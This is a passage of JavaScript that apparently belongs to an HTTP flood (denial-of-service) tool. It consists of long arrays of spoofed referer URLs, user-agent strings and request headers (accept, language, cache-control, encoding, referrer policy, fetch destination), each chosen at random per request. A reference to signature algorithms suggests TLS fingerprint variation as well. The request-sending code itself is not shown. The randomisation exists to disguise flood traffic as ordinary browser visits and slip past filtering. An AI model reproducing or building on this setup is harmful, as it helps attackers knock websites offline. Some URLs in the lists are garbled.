    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
  ];
var Ref = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');
const uap = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
	"Python-urllib/2.5",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Go-http-client/2.0",
	"Python-urllib/2.5",
	"Python-urllib/2.5",
	"Python-urllib/2.5",
	"Python-urllib/2.5",
	"Python-urllib/2.5",
	"Python-urllib/2.5",
  "VLC/3.0.0-git LibVLC/3.0.0-git",
  "VLC/3.0.3 LibVLC/3.0.3",
  "VLC/3.0.7 LibVLC/3.0.7",
  "VLC/3.0.8 LibVLC/3.0.8",
  "VLC/3.0.9 LibVLC/3.0.9",
  "VLC/3.0.6 LibVLC/3.0.6",
  "VLC/3.0.9.2 LibVLC/3.0.9.2",
  "VLC/3.0.10 LibVLC/3.0.10",
  "VLC/3.0.11 LibVLC/3.0.11",
  "VLC/3.0.11.1 LibVLC/3.0.11.1",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:213.32.4.115]",
  "VLC/3.0.1 LibVLC/3.0.1",
  "VLC/3.0.4 [ip:213.32.4.224]",
  "VLC/3.0.8 LibVLC/3.0.11",
  "VLC/3.0.4 [ip:213.32.4.81]",
  "VLC/3.0.4 [ip:213.32.4.115]",
  "VLC/3.0.4 [ip:213.32.4.245]",
  "VLC/3.0.4 [ip:213.32.4.95]",
  "VLC/3.0.4 [ip:213.32.4.247]",
  "VLC/3.0.4 [ip:213.32.4.211]",
  "VLC/3.0.4 [ip:213.32.4.102]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:185.11.195.67]",
  "VLC/3.0.2 LibVLC/3.0.2",
  "VLC/3.0.4",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:213.32.4.95]",
  "VLC/3.0.8 LibVLC/3.0.8 [ip:213.32.4.247]",
  "VLC/3.0.10 LibVLC/3.0.11",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:87.18.54.182]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:93.42.32.204]",
  "VLC/3.0.7 LibVLC/3.0.7 [ip:2.37.200.220]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:93.39.116.153]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:213.32.4.245]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:95.250.185.210]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:46.83.135.112]",
  "VLC/3.0.11 LibVLC/3.0.11 [ip:31.177.41.202]",
  "VLC/3.0.12 LibVLC/3.0.12",
  "VLC/3.0.12.1 LibVLC/3.0.12.1",
  "VLC/3.0.0 LibVLC/3.0.0",
  "VLC/3.0.10 LibVLC/3.0.12",
  "VLC/3.0.11 LibVLC/3.0.12",
  "VLC/3.0.0-git Lib",
  "VLC/3.0.8 LibVLC/3.0.8 Lavf/56.15.102 Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Firefox/60.0",
  "VLC/3.0.13 LibVLC/3.0.13",
  "VLC/3.0.14 LibVLC/3.0.14",
  "VLC/3.0.14 LibVLC/3.0.12",
  "VLC/3.0.12 LibVLC/2.1.5",
  "VLC/3.0.11",
  "VLC/3.0.15 LibVLC/3.0.15",
  "VLC/3.0.14 LibVLC/3.0.15",
  "VLC/3.0.16 LibVLC/3.0.16",
  "VLC/3.0.0-git-20150101-0402 LibVLC/3.0.0-git-20150101-0402",
  "VLC/3.0.14 LibVLC/3.0.11",
  "VLC/3.0.11 LibVLC/3.0.14",
  "VLC/3.0.12 LibVLC/3.0.16",
  "VLC/3.0.16 LibVLC/3.0.14",
  "VLC/3.0.0-rc5 LibVLC/3.0.0-rc5",
  "VLC/3.0.11 LibVLC/3.0.16",
  "VLC/3.0.0-rc6 LibVLC/3.0.0-rc6",
  "VLC/3.0.14 LibVLC/3.0.16",
  "VLC/3.0.0-git-20150109-0002 LibVLC/3.0.0-git-20150109-0002",
  "VLC/3.0.11.2 LibVLC/3.0.11.2",
  "VLC/3.0.12 LibVLC/3.0.11",
  "VLC/3.0.11 LibVLC/3.0.3",
  "VLC/3.0.10 LibVLC/3.0.8",
  "VLC/3.0.3 LibVLC/3.0.2",
  "VLC/3.0.8 LibVLC/3.0.8 Lavf/56.15.102 Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 MAG200 stbapp ver: 2 rev: 250 Safari/537.36 Firefox/60.0",
  "VLC/3.0.9.2",
  "VLC/3.0.0-git-20150129-0002 LibVLC/3.0.0-git-20150129-0002",
  "VLC/3.016 LibVLC/3.0.16",
  "VLC/3.0.16 LibVLC/3.0.15",
  "VLC/3.0.17 LibVLC/3.0.17",
  "VLC/3.0.17.3 LibVLC/3.0.17.3",
  "VLC/3.0.17.2 LibVLC/3.0.17.2",
  "VLC/3.0.17.4 LibVLC/3.0.17.4",
  "VLC/3.0.16 LibVLC/3.0.17.4",
  "VLC/3.0.16 LibVLC/3.0.6",
  "VLC/3.0.17.4 LibVLC/3.0.12",
  "VLC/3.0.18-rc LibVLC/3.0.18-rc",
  "VLC/3.0.8 LibVLC/3.0",
  "VLC/3.0.18 LibVLC/3.0.18",
  "VLC/3.0.6 LibVLC/3.0.17.4",
  "VLC/3.0.18-rc2 LibVLC/3.0.18-rc2",
  "VLC/3.0.11 LibVLC/3.0.8",
  "VLC/3.0.19 LibVLC/3.0.19",
  "VLC/3.0.4 LibVLC/3.0.17.4",
  "VLC/3.0.17.4 LibVLC/3.0.18",
  "VLC/3.0.16 LibVLC/3.0.18",
  "VLC/3.0.10 LibVLC/3.0.16",
  "VLC/3.0.16 LibVLC/3.0.12",
  "VLC/3.0.7.1 LibVLC/3.0.6",
  "VLC/3.018 LibVLC/3.0.18",
  "VLC/3.0.3 LibVLC/3.0.18",
  "VLC/3.0.18 LibVLC/3.0.7",
  "VLC/3.016 LibVLC/3.0.16/VAVOO/2.6",
  "VLC/3.0.18 LibVLC/3.0.14",
  "VLC/3.0.18 LibVLC/3.0.16",
  "VLC/3.0.19 LibVLC/3.0.18",
  "VLC/3.0.20 LibVLC/3.0.20",
  "VLC/3.0.19 LibVLC/3.0.20",
  "VLC/3.0.18 LibVLC/3.0.20",
  "VLC/3.0.16",
  "LG-H440n/V10f Player/LG Player 1.0 for Android 5.0.1 (stagefright alternative)",
  "LG-H870/V30c Player/LG Player 1.0 for Android 9 (stagefright alternative)",
  "LG-K430/V10a Player/LG Player 1.0 for Android 6.0 (stagefright alternative)",
  "LM-V405/V30d Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q610.FGN/V20o Player/LG Player 1.0 for Android 9 (stagefright alternative)",
  "LM-G850/V20o Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q710.FGN/V10a Player/LG Player 1.0 for Android 8.1.0 (stagefright alternative)",
  "LG-M250/V20b Player/LG Player 1.0 for Android 8.1.0 (stagefright alternative)",
  "LGL455DL/V20s Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-X410.FN/V10o Player/LG Player 1.0 for Android 7.1.2 (stagefright alternative)",
  "LG-D620/V20e Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LM-X410.FN/V10n Player/LG Player 1.0 for Android 7.1.2 (stagefright alternative)",
  "LGL555DL/V20n Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LGL355DL/V10r Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-H815/V20l Player/LG Player 1.0 for Android 6.0 (stagefright alternative)",
  "LM-Q730/V11g Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-X525/V20c Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-D802/V30d Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LG-H932/V30d Player/LG Player 1.0 for Android 9 (stagefright alternative)",
  "LM-Q720/V20e Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-K430/V10j Player/LG Player 1.0 for Android 6.0 (stagefright alternative)",
  "LM-Q730/V11f Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.5.3206.55",
  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Vivaldi/6.5.3206.55',
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.1998.64",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3528.15 Safari/537.36",
  "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
	"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
	"portalmmm/2.0 N410i(c20;TB) ",
	"Python-urllib/2.5",
	"Go-http-client/2.0",
	"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
	"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
	"SearchExpress",
	"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
	"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
	"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
  "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
	"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT100/R101",
  "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0.16823/1428; U; en) Presto/2.2.0",
	"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
	"Opera/9.80 (Macintosh; Intel Mac OS X; U; en) Presto/2.6.30 Version/10.61",
	"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
	"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
	"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
	"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
  "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
	"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
	"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonT68/R201A",
	"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
	"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
	"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
	"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
	"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
  "HTC_HD2_T8585 Opera/9.70 (Windows NT 5.1; U; de)",
  "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
  "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
  "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
  "FlyCast/1.35 (BlackBerry; 9530/4.7.0.99 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/-1)",
  "FlyCast/1.34 (BlackBerry; 8330/4.5.0.131 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/-1)",
  "FlyCast/1.32 (BlackBerry; 8330/4.3.0.124 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/-1)",
  "Bot",
  "L-01L/V20i Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-D390n/V20b Player/LG Player 1.0 for Android 5.0.1 (stagefright alternative)",
  "LG-H420/V10e Player/LG Player 1.0 for Android 5.0.1 (stagefright alternative)",
  "LM-Q720/V20h Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-D802/V30f Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LG-H872/V10l Player/LG Player 1.0 for Android 7.0 (stagefright alternative)",
  "LG-K330/V10n Player/LG Player 1.0 for Android 5.1.1 (stagefright alternative)",
  "LM-V450/V20n Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-H933/V30k Player/LG Player 1.0 for Android 9 (stagefright alternative)",
  "LG-V530/V10a Player/LG Player 1.0 for Android 7.0 (stagefright alternative)",
  "LG-D724/V20c Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LGL555DL/V20g Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-D723/V20b Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "WM-LG8200/V10f Player/LG Player 1.0 for Android 7.0 (stagefright alternative)",
  "LM-Q730/V13f Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-D855/V30b Player/LG Player 1.0 for Android 6.0 (stagefright alternative)",
  "LM-Q720/V20f Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-M250/V10h Player/LG Player 1.0 for Android 7.0 (stagefright alternative)",
  "LG-K350/V10i Player/LG Player 1.0 for Android 6.0 (stagefright alternative)",
  "LG-F560K/V10j Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LM-X525/V20a Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q730/V10e Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-G710/V30e Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-G820/V20j Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-H873/V15c Player/LG Player 1.0 for Android 7.0 (stagefright alternative)",
  "LM-G820/V21a Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-K510/V20j Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q630/V20b Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q610(FGN)/V20g Player/LG Player 1.0 for Android 9 (stagefright alternative)",
  "LM-V510N/V20u Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LG-H522/V10b Player/LG Player 1.0 for Android 5.0.2 (stagefright alternative)",
  "LGL355DL/V10k Player/LG Player 1.0 for Android 10 (stagefright alternative)",
  "LM-Q610.FGN/V10b Player/LG Player 1.0 for Android 8.1.0 (stagefright alternative)",
];

const type = [
	"text/plain",
	"text/html",
	"application/json",
	"application/xml",
	"multipart/form-data",
	"application/octet-stream",
	"image/jpeg",
	"image/png",
	"audio/mpeg",
	"video/mp4",
	"application/javascript",
	"application/pdf",
	"application/vnd.ms-excel",
	"application/vnd.ms-powerpoint",
	"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
	"application/vnd.openxmlformats-officedocument.presentationml.presentation",
	"application/vnd.openxmlformats-officedocument.wordprocessingml.document",
	"application/zip",
	"image/gif",
	"image/bmp",
	"image/tiff",
	"audio/wav",
	"audio/midi",
	"video/avi",
	"video/mpeg",
	"video/quicktime",
	"text/csv",
	"text/xml",
	"text/css",
	"text/javascript",
	"application/graphql",
	"application/x-www-form-urlencoded",
	"application/vnd.api+json",
	"application/ld+json",
	"application/x-pkcs12",
	"application/x-pkcs7-certificates",
	"application/x-pkcs7-certreqresp",
	"application/x-pem-file",
	"application/x-x509-ca-cert",
	"application/x-x509-user-cert",
	"application/x-x509-server-cert",
	"application/x-bzip",
	"application/x-gzip",
	"application/x-7z-compressed",
	"application/x-rar-compressed",
	"application/x-shockwave-flash"
];

var type1 = type[Math.floor(Math.floor(Math.random() * type.length))];

const accept_header = [
  'application/json',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
];

var accept1 = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];

const lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
];

var lang1 = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];

const polisi = [
  'no-referrer',
  'no-referrer-when-downgrade',
  'origin',
  'origin-when-cross-origin',
  'same-origin',
  'strict-origin',
  'strict-origin-when-cross-origin',
  'unsafe-url',
];

var policy1 = polisi[Math.floor(Math.floor(Math.random() * polisi.length))];

const controle_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60',
  'public, max-age=31536000',
  'max-age=14400, public',
  'max-age=14400',
  'max-age=600, private',
  'public, s-maxage=600, max-age=60',
  'no-store, no-cache, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64',
];

var chache1 = controle_header[Math.floor(Math.floor(Math.random() * controle_header.length))];

const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
];

var enco1 = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];

const xss2 = [
  '0',
  '1',
  '1; mode=block',
  '1; report=<reporting-uri>',
];

var xss1 = xss2[Math.floor(Math.floor(Math.random() * xss2.length))];

const platform = [
  "Windows",
  "Macintosh",
  "Linux",
  "Android",
  "PlayStation 4",
  "iPhone",
  "iPad",
  "Windows Phone",,
  "iOS",
  "Android",
  "PlayStation 5",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other"
];

var from1 = platform[Math.floor(Math.floor(Math.random() * platform.length))];

const dest_header = [
  'audio',
  'audioworklet',
  'document',
  'embed',
  'empty',
  'font',
  'frame',
  'iframe',
  'image',
  'manifest',
  'object',
  'paintworklet',
  'report',
  'script',
  'serviceworker',
  'sharedworker',
  "subresource",
  "unknown",
  'style',
  'track',
  'video',
  'worker',
  'xslt',
];

var dest1 = dest_header[Math.floor(Math.floor(Math.random() * dest_header.length))];

const mode_header = [
  'cors',
  'navigate',
